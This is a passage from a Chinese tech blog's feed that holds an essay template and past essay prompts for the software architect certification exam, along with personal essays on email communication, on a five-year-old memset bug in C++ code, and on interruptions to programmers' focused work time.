title="示例论文"></a>示例论文</h3><p><strong>摘要：</strong></p><p>201x年11月，由于我司现有的 【告警保障系统 服役时间太长，性能、维护、扩展等多方问题日益严重】 <font color="blue">（项目背景）</font>，于是我所在的 【网管团队】 <font color="blue">（公司、团队）</font>启动了 【告警保障系统】 <font color="blue">（项目名称）</font>的项目重构开发。该系统包括 【告警的采集过滤和上报、告警的规则事务管理、数据模型转换管理、通信协议管理、统计报表生成、资源集中监控器等多个业务功能模块，以及其他预留的扩展功能接口】 <font color="blue">（简单项目介绍，功能等）</font>。</p><p>在该项目中，我担任了架构师的职责，通过采取 zzz <font color="blue">（论文主题，包括相关的技术、方法、工具、措施）</font>，使项目得以实施完成，并正稳定地投入使用。本文将结合我的实际工作经验，对相关过程进行描述。</p><p><strong>正文：</strong></p><p>　1. 项目概述<font color="blue">（400-600字，切忌照抄摘要）</font>：<br>　　1.1. 开发项目概述<br>　　1.2. 我承担的角色和工作<br>　　1.3. 项目的架构情况概述</p><p>　2. 采用的技术，为什么<font color="blue">（1000-1400字，直奔论文主题，可以图文并茂，分点论述，但层次不宜太深）</font></p><pre><code>架构角度：整体框架采用了 主程序-子程序架构风格设计模式：    核心功能模块采用了 生产者消费者模式、有限状态机模式，以及为了容错采用的备忘录模式。    辅助功能模块采用了多种设计模式，           如共享资源的工厂模式、数据协议转换的适配器模式、资源集中监控器的中介者模式，             特定的算法模板、配置的单例模式等等质量属性：    性能：统计报表结合sqlite和内存映射，减少IO；          系统关键位置的多线程资源解耦，避免同步。          苛刻对待内存管控，避免浪费开销。          使用数据池、线程池技术。          数据结构的选择，JVM数据结构的运行，关键代码采用本地化方式优化（牺牲平台无关性）          输入输出优化：后台集群、缓存。     可修改性：预留扩展接口，保证可扩展性。              Maven架构管理构件，SVN版本控制（可维护性）              完善的程序文档    可靠性：预防式编程，健壮性            Socket中介，减少数据库直连数    可用性：心跳，异常捕获，logback日志跟踪，基于签到模式的统计，及时发现故障并自动恢复    安全性：与Socket交互先登录，保证授权使用（机密性）            核心口令采用C++编写（机密性，牺牲平台无关性）            混淆打包（机密性）    可测试性：持续集成，测试驱动开发，功能模块保留完整测试用例，更新算法时先用用例验证。容错设计：    以检错设计为主，核心模块采用动态冗余（采集、适配、上报）构件管理：常用构件平台，构件管理Maven与Nexus（第三方成品构件）</code></pre><p>　3. 技术的效果<font color="blue">（200-300字，佐证论点的好处）</font></p><p>　4. 不足之处和改进方案<font color="blue">（200-300字，万事不尽美，报喜不报忧会很假）</font></p><p>　5. 总结<font color="blue">（100-200字，心得，我学到了什么，可以合并到第4点）</font></p><pre><code>通过使用xxx技术，最终有效地 aaa （特色之处、发展趋势），但也遇到了一些问题： bbb （不足之处、如何改进）。</code></pre><h3 id="历年论文题目"><a href="#历年论文题目" class="headerlink" title="历年论文题目"></a>历年论文题目</h3><h4 id="2014论软件需求管理（P109）"><a href="#2014论软件需求管理（P109）" class="headerlink" title="2014论软件需求管理（P109）"></a>2014论软件需求管理（P109）</h4><p>软件需求管理是一个对系统需求变更了解和控制的过程。需求管理过程与需求开发过程相互关联，初始需求导出的同时就要形成需求管理规划，一旦启动了软件开发过程，需求管理活动就紧密相伴。</p><p>需求管理过程中主要包含变更控制、版本控制、需求跟踪和需求状态跟踪等4项活动，其目标是为项目管理人员建立一个软件需求基线，并保持软件计划、产品和活动与软件需求的一致性。</p><p>问题：请以“<strong>软件需求管理</strong>”为题，依次从以下三个方面进行论述。</p><ul><li>1．概要叙述你参与管理和开发的软件项目以及你在其中所担任的主要工作。</li><li>2．详细描述<strong>需求管理过程中各个活动中的主要工作</strong>。</li><li>3．详细说明你所参与的软件开发项目中，是如何进行软件需求管理的，实施的具体效果如何。</li></ul><h4 id="2014论非功能性需求对企业应用架构设计的影响（软件架构策略）"><a href="#2014论非功能性需求对企业应用架构设计的影响（软件架构策略）" class="headerlink" title="2014论非功能性需求对企业应用架构设计的影响（软件架构策略）"></a>2014论非功能性需求对企业应用架构设计的影响（软件架构策略）</h4><p>企业应用架构(Enterprise Application Architecture) 描述了企业IT系统的功能和技术实现内容，它在企业信息化建设中起到了统一规划、承上启下的作用，向上承接了企业战略发展方向和业务模式，向下规划和指导企业各IT系统的定位和功能。企业应用架构包括了企业的应用架构蓝图、架构标准、系统的边界和定义、系统间的关联关系等。其中非功能性需求是进行企业应用架构设计时需要重点考虑的因素，不同类型的非功能性需求从不同侧面影响应用系统的架构设计。</p><p>问题：请以“<strong>非功能性需求对企业应用架构设计的影响</strong>”为题，依次从以下三个方面进行论述。</p><ul><li>1．概要叙述你参与分析和开发的企业应用系统项目以及你所担任的主要工作。</li><li>2．分析在<strong>企业应用架构设计中应该考虑哪些非功能性需求</strong>，详细阐述<strong>这些非功能性需求是如何影响架构设计</strong>的。</li><li>3．详细说明你所参与的企业应用系统项目中，在进行系统架构设计时，考虑了哪些非功能性需求，如何通过架构设计满足了系统的这些非功能性需求。</li></ul><h4 id="2014论软件的可靠性设计（P377）"><a href="#2014论软件的可靠性设计（P377）" class="headerlink" title="2014论软件的可靠性设计（P377）"></a>2014论软件的可靠性设计（P377）</h4><p>现代军事和商用系统中，随着系统中软件成分的不断增加，系统对软件的依赖性越来越强。软件可靠性已成为软件设计过程中不可或缺的重要组成部分。实践证明，保障软件可靠性最有效、最经济、最重要的手段是在软件设计阶段采取措施进行可靠性控制，由此提出了可靠性设计的概念。可靠性设计就是在常规的软件设计中，应用各种方法和技术，使程序设计在兼顾用户的功能和性能需求的同时，全面满足软件的可靠性要求。</p><p>问题：请以“<strong>软件的可靠性设计</strong>”为题，依次从以下三个方面进行论述。</p><ul><li>1．概要叙述你参与管理和开发的软件项目以及你在其中所担任的主要工作。</li><li>2．简要说明目前比较主流的<strong>软件可靠性设计技术</strong>，结合项目实际情况，阐述<strong>所选择的可靠性设计技术及其原因</strong>。</li><li>3．结合你具体参与管理和开发的实际项目，举例说明所选取的软件可靠性技术的具体实施过程，并详细分析实施效果。</li></ul><h4 id="2014论网络安全体系设计"><a href="#2014论网络安全体系设计" class="headerlink" title="2014论网络安全体系设计"></a>2014论网络安全体系设计</h4><p>随着社会信息化的普及，计算机网络已经在各行各业得到了广泛的应用。目前，绝大多数业务处理几乎完全依赖计算机和网络执行，各种重要数据如政府文件、工资档案、财务账目和人事档案等均依赖计算机和网络进行存储与传输。另一方面，针对计算机和网络的攻击活动日益猖獗，网络安全已经成为当前社会的主要安全问题之一。</p><p>在上述背景下，国家标准《信息处理系统工程开放系统互联基本参考模型——第二部分：安全体系结构》（GB/T 9387.2-1995）定义了基于OSI参考模型7层协议之上的信息安全体系，其核心内容是：为了保证异构计算机进程与进程之间远距离交换信息的安全，定义了认证服务、访问控制服务、数据机密性服务、数据完整性服务和抗抵赖性服务等5大类安全服务，以及提供这些服务的8类安全机制及相应的OSI安全管理，并根据具体系统适当配置于OSI模型的7层协议之中。</p><p>问题：请以“<strong>网络安全体系设计</strong>”为题，依次从以下三个方面进行论述。</p><ul><li>1．概要叙述你参与管理和开发的软件项目以及你在其中承担的主要工作，并详细阐述该软件系统在网络安全方面的要求。</li><li>2．请对GB/T 9387.2-1995中定义的<strong>5大类安全服务</strong>进行描述，阐述<strong>每类安全服务的定义和主要实现手段</strong>。</li><li>3．请结合项目实际，具体阐述你在项目中实现了上述5大类安全服务中的哪些服务，具体运用了哪些实现手段。</li></ul><h4 id="2013论软件架构建模技术与应用（P181-图P103）"><a href="#2013论软件架构建模技术与应用（P181-图P103）" class="headerlink" title="2013论软件架构建模技术与应用（P181 - 图P103）"></a>2013论软件架构建模技术与应用（P181 - 图P103）</h4><p>软件架构用来处理软件高层次结构的设计和实施，它以精心选择的形式将若干结构元素进行装配，从而满足系统的主要功能和性能需求。软件架构设计的首要问题是如何表示软件架构，即如何对软件架构建模。根据建模的侧重点不同，可以将软件架构模型分为 <del>结构模型、框架模型、动态模型、过程模型和功能模型</del> 。Kruchten在1995年提出了“4+1”视图模型，将5种模型有机地统一在了一起。</p><p>问题：</p><ul><li>1．概要叙述你参与管理和开发的软件项目以及你在其中所承担的主要工作。</li><li>2．简要叙述<strong>“4+1”视图模型的主要内容</strong>。结合你参与项目的实际情况，详细说明该项目需求及所涉及的软件架构（包括使用到的视图模型、创建的架构模型及使用的建模工具等）。</li><li>3．说明该项目软件架构的实施效果，分析其是否满足了项目的需求并说明原因。</li></ul><h4 id="2013论软件可靠性设计技术的应用（P377）"><a href="#2013论软件可靠性设计技术的应用（P377）" class="headerlink" title="2013论软件可靠性设计技术的应用（P377）"></a>2013论软件可靠性设计技术的应用（P377）</h4><p>随着软件的日益普及，系统中软件成分不断增加，使得系统对软件的依赖越来越强。</p><p>软件的可靠性对系统可靠性的影响越来越大。而实践证明，保障软件可靠性最有效、最经济、最重要的手段是在软件设计阶段采取措施进行可靠性控制，为此提出了软件可靠性设计的概念。</p><p>软件可靠性设计就是在常规的软件设计中，应用各种方法和技术，使软件设计在兼顾用户功能和性能需求的同时，全面满足软件的可靠性要求。软件可靠性设计应和软件的常规设计紧密结合，贯穿于软件设计过程的始终。</p><p>问题：</p><ul><li>1．概要叙述你参与管理和开发的软件项目以及你在其中所承担的主要工作。</li><li>2．结合项目实际，论述你在项目开发过程中，进行<strong>软件可靠性设计时遵循的基本原则</strong>；论述你在该项目中所采用的具体<strong>可靠性设计技术</strong>。</li><li>3．阐述你在具体的可靠性设计工作中，为了分析影响软件可靠性的主要因素，所采用的可靠性分析方法。</li></ul><h4 id="2012论基于架构的软件设计方法及应用（P131）"><a href="#2012论基于架构的软件设计方法及应用（P131）" class="headerlink" title="2012论基于架构的软件设计方法及应用（P131）"></a>2012论基于架构的软件设计方法及应用（P131）</h4><p>本题考查的知识点是<strong>ABSD</strong>。</p><p>ABSD （architecture-based software design,基于体系结构的软件设计）方法。ABSD方法是体系结构驱动，即指构成体系结构的商业、质量和功能需求的组合驱动的。使用ABSD方法，设计活动可以从项目总体功能框架明确就开始，这意味着需求抽取和分析还没有完成（甚至远远没有完成），就开始了软件设计。设计活动的开始并不意味着需求抽取和分析活动就可以终止，而是应该与设计活动并行。特别是在不可能预先决定所有需求时，例如产品线系统或长期运行的系统，快速开始设计是至关重要的。</p><p>这种方法的主要阶段包括：</p><p><img src="./04.png"></p><h4 id="2012论企业应用系统的数据持久层架构设计"><a href="#2012论企业应用系统的数据持久层架构设计" class="headerlink" title="2012论企业应用系统的数据持久层架构设计"></a>2012论企业应用系统的数据持久层架构设计</h4><p>本题考查<strong>数据持久层架构设计</strong>。</p><p>数据持久层位于领域层和基础架构层之间。由于对象实例和关系实例这两大领域之间存在“阻抗不匹配”,所以把数据持久层单独作为一个层提出来的原因就是能够在对象-关系数据库之间提供一个成功的企业级映射解决方案，尽最大可能弥补这两种实例之间的差异。</p><p>本题要求分析持久层架构设计中有哪些数据访问模式，数据访问模式包括：在线访问、Data Access Object、Data Transfer Object、离线数据模式、对象/关系映射（O/R Mapping:Object/Relation Mapping）。此处需要详细描述这些模式的主要内容。</p><h4 id="2012论决策支持系统的开发与应用"><a href="#2012论决策支持系统的开发与应用" class="headerlink" title="2012论决策支持系统的开发与应用"></a>2012论决策支持系统的开发与应用</h4><p>本题考查<strong>决策支持系统</strong>的开发。</p><p>决策支持系统（Decision Support System,DSS）是辅助决策者通过数据、模型和知识，以人机交互方式进行半结构化或非结构化决策的计算机应用系统。它是MIS向更高一级发展而产生的先进信息系统。它为决策者提供分析问题、建立模型、模拟决策过程和方案的环境，调用各种信息资源和分析工具，帮助决策者提高决策水平和质量。</p><p>要完成本题的写作，需要充分了解决策支持系统的概念，这种系统有何用途，以分析，为什么要建立决策分析系统。并需要了解决策支持系统的建设与一般MIS系统有何区别，这样才能找出题目中要求的“在建立决策支持系统时需要解决的一般关键问题”.些处的关键问题，可以因不同项目而异，所以说明需要解决的关键问题时，还需给出合理的分析，为什么这是个关键问题。</p><h4 id="2012论企业信息化规划的实施与应用"><a href="#2012论企业信息化规划的实施与应用" class="headerlink" title="2012论企业信息化规划的实施与应用"></a>2012论企业信息化规划的实施与应用</h4><p>本题的考查方向是<strong>企业信息化规划</strong>。</p><p>企业信息化规划是企业信息化建设的纲领和向导，是信息系统设计和实施的前提和依据，意义重大。文章中应首先描述企业战略与企业信息化规划之间的关系，并实质性的指出目前企业的战略，由此而来的信息化规划要求。</p><p>在进行信息化规划过程中，需要注意方法的应用，方法包括但不限于：企业系统规划方法（BSP）、战略数据规划方法、信息工程方法。选择其中的一种，说明，为什么采用这种方法，作者是如何采用这种方法来做规划的，步骤效果如何。</p><p>最后题目要求总结经验，分析效果，以及分析原因，这里其实是暗示大家，信息化规划不可能做到尽善尽美，总会有问题存在。所以此时不要“报喜不报忧”,这样会显得很假，需要指出一些实质性的问题，再给出解决方案，这样会显得更加的真实。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 系统架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统架构师 </tag>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你难道没收到我的邮件？</title>
      <link href="/articles/insights/ni-nan-dao-mei-shou-dao-wo-de-you-jian/"/>
      <url>/articles/insights/ni-nan-dao-mei-shou-dao-wo-de-you-jian/</url>
      
        <content type="html"><![CDATA[<p>细数公司十大经典金句之首，当孰【你难道没收到我的邮件？】无疑（了吧~ 我发誓我木有统计过）——尤其是邮件作为我们公司主要的沟通手段之一，我对这句话可谓印象深刻了。</p><p>回想刚到公司的时候，我还不会打座机电话（我承认我真的去学了打电话…），当时跟工程同事唯一的沟通手段就是邮件，有时甚至把邮件当QQ用了。但毕竟邮件不是QQ，时效性略差。有时候一些问题得不到确认，于是事后问对方最多的就是你有没有收到我的邮件了。</p><p>通常情况下，我们大部分人都有一个认知误区：只要把邮件发给对方了，对方就一定会知晓并执行，于是自己的沟通任务就完成了。但事实是，对方很可能没有（及时）收到邮件，即使收到了邮件，也不代表能够理解、接受、甚至执行。</p><p><img src="./01.png"></p><p>沟通并不仅仅是发送邮件那么简单——发送邮件不过是沟通手段的一种，切莫把沟通手段和沟通过程混淆了。</p><p>真正意义上的沟通，是指思想碰撞并传递的过程。只有我和你能够以相同的角度去看待某个问题、理解其细节，才能说我和你完成了沟通。否则即使你清楚明白地看到了（听到了）我的每字每句，但是你不理解我的意思，那我和你也没有做任何有实际意义的沟通。</p><p>邮件上的沟通，按我们通常的说法，充其量只是“存证式的沟通”。确实它可以作为沟通证据，但过于依赖邮件则可能造成沟通障碍——尤其是当邮件包含的信息量越大，其中的细节就越容易被忽略。</p><p>况且信息淹没只是沟通障碍的一种。文化背景、个人偏见等主观因素也会成为沟通障碍的帮凶。为了减少类似不必要的障碍，我现在工作的时候，更倾向于面对面的、或电话式的交流，同时我也会定期写一些文章，借此向身边的人表述我近期的观点或见闻——我觉得消除障碍最好的方法就是让别人可以更直接地了解自己。</p><p>我越来越觉得，当一个问题被过于依赖用邮件去处理时候，处理周期越长，它就像抛绣球似得被抛来抛去。多用面对面或电话式的沟通，则可以促使我们在当下通过讨论去解决、反思问题。而写文章则可以避免直面的尴尬，在特定的时期向其他人表述自己的观点。</p><p>实际上，我一直以来都有写文章的习惯，而且我有自己的Blog。但自从去年开始公司办了内刊，我就把本应发表去Blog的一部分文章改投放到公司内刊了。原因有二：一是可以令身边的人更了解我的想法，增强他人对自己的熟悉感会利于平时沟通；二是我更喜欢公司有个人可以帮我对文章把关，使我的文笔有所提升——我并不介意文章被挑剔，因为我始终相信：“谁越是对你的文笔斤斤计较，谁就越可能是决定你前途的人”。</p><p>但沟通不仅仅相互理解、消除障碍就足够了。沟通也是需要策略的，首要一条就是让对方可以听懂并接受的方式去表述，否则只会徒增对方的失落感、甚至乎反感。其次就是用可以吸引对方注意力的方式去表述——我相信相比起一本新书，遍布重点的参考书更有吸引力，尤其在考试前。</p><p>最后我需要声明的是，写下这篇文章，并不是说邮件沟通有什么不好。恰恰相反，邮件作为“存证式”的沟通手段，是其他沟通方式不能替代的。而之所以用邮件说明问题，不过是作为这篇劣文一个引子，我真正所倡导的，是灵活、有效的沟通过程——这才是我们需要的——我们大可以在完成沟通后，再用邮件来存证一下不是么？</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沟通 </tag>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找 BUG 记</title>
      <link href="/articles/insights/zhao-bug-ji/"/>
      <url>/articles/insights/zhao-bug-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="令人头痛的陈年老BUG（序章）"><a href="#令人头痛的陈年老BUG（序章）" class="headerlink" title="令人头痛的陈年老BUG（序章）"></a>令人头痛的陈年老BUG（序章）</h2><p>前几天，码农朋友甲（下文简称“甲”）拿着我5年前发表在某博文的代码问我：“这段代码是有bug吧？”下面就是他给我指出来的一段C++代码，大家可以先尝试能不能找到甲看到的bug：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Initial</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    TimeStamp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 时间戳</span>    DFN <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 搜索次序</span>    Low <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 能够回溯的最早次序号</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>DFN<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>Low<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    SCC_id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    SCC <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 辅助栈</span>    Status <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 辅助栈状态</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>Status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sp <span class="token operator">=</span> new Shrink_point<span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 缩点（极大强连通分量）</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">setIntArrayVal</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> array<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>诚然，突然要我查一段几年前写下的代码是否有bug，我内心是比较抗拒的——尤其是我自己写的代码（我对自己还是有相当自信的）——毕竟人的弱点就是不善于揭发自己的短处。不过这都只是次要的心理因素。</p><p>归根结底，所谓打铁趁热，bug也是越早发现越好，**<em>新代码的bug总是要比历史代码的bug更容易处理**</em>。而面对这个陈年老bug，我已经完全忘记了我在5年前写这段代码的思绪，所以要我马上就应付甲的质疑是不可能的。与其再花费一番周折琢磨我自己的代码，我干脆直接就举手投问：“所有测试用例运行可以通过，是哪里有bug呢？”</p><h2 id="因注释而蔓延"><a href="#因注释而蔓延" class="headerlink" title="因注释而蔓延"></a>因注释而蔓延</h2><p>甲告诉我，是memset函数使用错误：在C++中，函数memset的作用是对一段连续的内存块赋值，即赋值的单位是字节，换而言之memset只能用于字节数组，但int数组不是字节数组。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">setIntArrayVal</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> array<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>老实说，我很高兴甲会如此仔细的看我5年前的代码。而且毫无疑问，他的观点是正确的。但是也不见得我就是错的。因为早在那时我就已经知道memset函数的局限所在，但我坚持要用这个函数做数组的初始化，是因为我看中了它的效率——</p><p>相对于逐个赋值的方法初始化数组元素、memset的效率要高得多，因为从寻址次数来看，前者的时间复杂度是O(n)、后者是O(1)，更何况当时所解决问题的n是上千万级别的。虽然我把memset用在非字节数组，只要我保证初始化的值只为0就不会有任何问题。事实上也是如此。</p><p>于是我自信满满地告诉甲，单纯断章取义地看我这个方法，确实是一个bug。但如果整体地去看我的代码就恰恰相反，**<em>我只是利用了bug，并得到了更高效的处理**</em>。</p><p>但是甲之后的一席话确实值得我深思：</p><p>“或许对目前的这份代码而言，这个bug是被你巧妙地利用了，但是我觉得**<em>真正的bug或许不是你的代码，而是你没有文字注释去说明你的想法**</em>。不要忘记你已经共享了你的代码，当更多人看到这段程序时，如果他们不了解menset的原理就照样搬用，那么你就无异于在别人的代码中散播了bug，因为你不能把他们代码中的val限制为0。”</p><h2 id="最危险的组合"><a href="#最危险的组合" class="headerlink" title="最危险的组合"></a>最危险的组合</h2><p>不得不承认，甲是对的。即使我有足够的自信在5年后仍然记得利用这个bug的前因后果，但在这5年间早已误了不少别人的子弟……</p><p>不过话说回来，先不论这个bug的蔓延性，甲能够如此深入琢磨我的历史遗留物、并发现这个bug实属难得——在软件中有一种bug是最难被发现的：组合式的bug。组合式的bug有两种类型：相辅相成型、相互弥补型——甲在我代码中发现的bug就属于后者。</p><p>相辅相成型：举例而言，一个bug是楼梯很滑，另一个bug扶手坏了，但除非这两个bug同时存在，否则只有其中一个bug是不足以让人摔下楼梯的。</p><p>相互弥补型：它与相辅相成型刚好相反，只有两个bug同时存在（或不存在）程序才会正常运行。若只修正了其中一个bug，另一个bug就会曝露出来，而且会让人有误以为自己改错了的假象，因为修改之前程序是可以正常运行的。</p><p>之所以说它难以发现，因为组合bug几乎无迹可寻，尤其是相互弥补型。除非是编译原理的狂热爱好者、抑或出现了非常极端的运行环境。**<em>存在组合bug的程序，其通常状态无异于正常程序，而且可能正常运行了很长时间都没有曝露出来**</em>。</p><p>回到我的代码，它已经正常运行5年了。如果甲没有向我质问他心中的疑惑，而是擅自修改了他所发现的bug，那么我的程序就无法正常运行了——而甲就很可能会因此陷入怀疑自己的正确性的境地。</p><h2 id="令人头痛的陈年老BUG（终章）"><a href="#令人头痛的陈年老BUG（终章）" class="headerlink" title="令人头痛的陈年老BUG（终章）"></a>令人头痛的陈年老BUG（终章）</h2><p>事实上，不是所有bug都需要解决掉的。很多时候我们明明知道正在为代码引入一个bug，但是我们却依然保留它。因为回避它的代价太大了，我们宁愿限制它的前提条件不让它轻易发生、或者将其“圈养”起来（如try-catch）不让它暴走——**<em>如何容忍bug也是一门学问**</em>。</p><p>不过也总有一些技术葩喜欢另辟蹊径，誓言要代表月亮消灭所有bug维护代码界安全——先不说甲就是这种人，反正我是不会去消灭一个几年前就已经知道的bug的。如果要消灭它，我当时就做了，何必等到现在。</p><p>这前面提到的“新bug更易于旧bug被解决”是一个原因，但我真正担忧的是我或许会引入更多不可控的bug——代码的历史太久远了，我已经近乎忘记了它的逻辑，我一旦盲目修改，完全有可能采用了更危险的方法去解决那个稳定了5年的bug。</p><p>很多时候，我们写完一段代码，只要程序能够编译运行、完成需求功能就算完成了，鲜有考究bug的可能性，大部分的bug都是通过日后使用时再去发现和解决的。其实解决bug的黄金时间在于代码刚被编写的时候，这时候我们往往只需看到异常提示，就可以马上定位异常原因，因为潜意识中我们已经隐约觉得哪个位置会报什么异常了。</p><p>所以当我们在面对一些陈年老bug的时候，其实早就已经错过了解决它的最好时机。这时候不妨将其圈养起来，可能相比于消灭它，会令代码更安全。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> BUG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请还我安静的 4 小时</title>
      <link href="/articles/insights/qing-huan-wo-an-jing-de-4-xiao-shi/"/>
      <url>/articles/insights/qing-huan-wo-an-jing-de-4-xiao-shi/</url>
      
        <content type="html"><![CDATA[<p>我大概总结了我每天分配的工作时间，一般情况下，我是这样汇报我的工作情况的：</p><p><img src="./01.png" alt="我理想中的工作时间表"></p><p>实际上，我的工作情况却可能是这样的：</p><p><img src="./02.png" alt="我现实中的工作时间表"></p><p>表面看来，这两个时间表所完成的工作内容是一模一样的，而且第一个时间表似乎可以更清晰地表述我一天的工作情况。但是它却无法反映出我的困扰：正如第二个凌乱的时间表所示——我的工作实际上是由无数的时间碎片构成的，而我们大部分人可能早已习惯了这个不正常的时间表。</p><p>通常，管理者为了更有效率地利用时间，他们很擅长在同一个时间处理多个问题，因为这可以体现出他们处事的应变能力。但我们程序员则更倾向于能够专注地做一件事：同样一件事，相比于断断续续地做4小时，专心地连续做4小时的效率要高得多。工作本就贵在专注，而一旦那种专注的状态被破坏，要恢复这种状态非但不易、而且还会白白浪费很多时间。</p><p>大家曾经都可能玩过一个堆纸牌金字塔的游戏，越想要砌得高、所需要的专注时间越长： </p><p><img src="./03.png"></p><p>程序员开发软件，就好比堆纸牌的过程，想要迅速稳固，那么从开始到完成必须一气呵成，中途不能受到一丝打扰，否则整座金字塔都会散架，只能重头开始。</p><p>开发好的软件需要投入大量的精神时间，没有一段时间的酝酿是无法开展工作的。有时我们好不容易才有了一个构思的雏形，突如其来的打扰就会造成整个构思破产。这就是为什么每个程序员都非常讨厌在工作时被打扰的原因——可能十分钟的打扰，会多浪费我们一个小时的时间——这绝不是夸大其辞。</p><p>可惜往往事与愿违，公司绝大多数的环境都不允许我们安静地坐下来，完完全全地做自己的工作。在公司每天都有着持续不断的商讨、邮件、电话需要处理，其实这些事情很多都不是主要工作，但是因为时效性要求很高，把我们真正的工作时间变得支离破碎。</p><p>此前，我看过一篇关于 